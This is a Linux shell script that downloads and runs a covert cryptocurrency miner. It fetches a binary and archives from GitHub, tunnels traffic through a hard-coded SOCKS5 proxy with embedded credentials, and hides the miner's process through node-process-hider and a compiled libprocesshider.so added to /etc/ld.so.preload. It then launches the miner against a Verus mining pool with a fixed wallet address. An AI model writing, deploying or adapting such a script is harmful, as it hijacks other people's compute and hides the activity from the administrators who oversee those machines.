#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install -y ocl-icd-opencl-dev

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.9.154.251:12324
socks5_username = 14a5029e51675
socks5_password = 9d332fa7c0
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo npm i -g node-process-hider

sudo wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enak >/dev/null 2>&1  

sudo chmod +x manuk >/dev/null 2>&1

sudo ph add manuk

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
unzip magicBezzHash.zip 
make 
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
mv libprocesshider.so /usr/local/lib/ 
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
 
./graftcp/graftcp ./manuk -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RBkxREY7wobWvRihJSkREPH2wycJqCECHZ.$(echo $(shuf -i 1-3 -n 1)-WEWEK) -p x -t 4
